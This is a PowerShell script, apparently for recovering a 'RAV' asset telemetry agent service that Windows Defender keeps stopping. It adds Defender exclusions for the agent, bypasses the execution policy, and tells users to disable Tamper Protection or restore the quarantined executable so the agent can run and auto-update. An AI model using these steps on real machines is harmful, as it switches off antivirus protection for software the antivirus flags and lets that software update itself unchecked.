#Requires -RunAsAdministrator
# ============================================================
# RAV agent recovery — run in an ELEVATED PowerShell on a box
# whose service shows "killed" (Stopped, exe still present).
#
# It (1) tells Defender to leave the agent alone, then (2) starts
# the service. Once running, the agent heartbeats and auto-updates
# itself to v2.0.0 — no MSI needed here.
#
# Usage: right-click PowerShell > Run as administrator, then:
#   Set-ExecutionPolicy Bypass -Scope Process -Force; .\fix-killed-box.ps1
# ============================================================

$svc = "AssetTelemetryService"
$dir = "C:\Program Files\Asset Telemetry"

Write-Host "`nRAV recovery on $env:COMPUTERNAME" -ForegroundColor Cyan

# 1. Defender exclusions (best-effort — Tamper Protection can refuse these)
try {
    Add-MpPreference -ExclusionPath $dir                              -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionPath "C:\ProgramData\RAV"              -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionProcess "AssetTelemetry.exe"           -ErrorAction SilentlyContinue
    Add-MpPreference -AttackSurfaceReductionOnlyExclusions "$dir\AssetTelemetry.exe" -ErrorAction SilentlyContinue
    Write-Host "  [OK]  Defender exclusions applied" -ForegroundColor Green
} catch {
    Write-Host "  [WARN] Could not set exclusions (Tamper Protection?)" -ForegroundColor Yellow
}

# 2. Start the service — but first check it's actually installed here, so a
#    test machine that never had the agent gets a clear message instead of a
#    scary red failure.
$existing = Get-Service $svc -ErrorAction SilentlyContinue
if (-not $existing) {
    Write-Host "  [INFO] No agent service on this computer — nothing to restart." -ForegroundColor Cyan
    Write-Host "         You only see this on a machine that never had the agent" -ForegroundColor Gray
    Write-Host "         installed (e.g. a test PC). On a real endpoint flagged" -ForegroundColor Gray
    Write-Host "         'killed', the service exists and this step starts it." -ForegroundColor Gray
} else {
    try {
        Start-Service $svc -ErrorAction Stop
        Start-Sleep -Seconds 8
        $s = Get-Service $svc -ErrorAction Stop
        if ($s.Status -eq 'Running') {
            Write-Host "  [OK]  Service started." -ForegroundColor Green
            # 3. Confirm it STAYS up (Defender kills within seconds if the
            #    exclusion didn't take — e.g. Tamper Protection).
            Start-Sleep -Seconds 20
            $s2 = Get-Service $svc
            if ($s2.Status -eq 'Running') {
                Write-Host "  [OK]  Service still running after 20s — it stuck." -ForegroundColor Green
                Write-Host "`nDone. It will auto-update to v2.0.0 on its next heartbeat." -ForegroundColor Cyan
            } else {
                Write-Host "  [FAIL] Service died again ($($s2.Status)) — Defender is still killing it." -ForegroundColor Red
                Write-Host "         Tamper Protection is likely ON. Open Windows Security >" -ForegroundColor Yellow
                Write-Host "         Virus & threat protection > Manage settings > turn OFF" -ForegroundColor Yellow
                Write-Host "         Tamper Protection, then re-run this script." -ForegroundColor Yellow
            }
        } else {
            Write-Host "  [WARN] Service state: $($s.Status)" -ForegroundColor Yellow
        }
    } catch {
        Write-Host "  [FAIL] Could not start service: $($_.Exception.Message)" -ForegroundColor Red
        Write-Host "         If the exe was quarantined, restore it from Windows Security >" -ForegroundColor Yellow
        Write-Host "         Protection history, then re-run." -ForegroundColor Yellow
    }
}
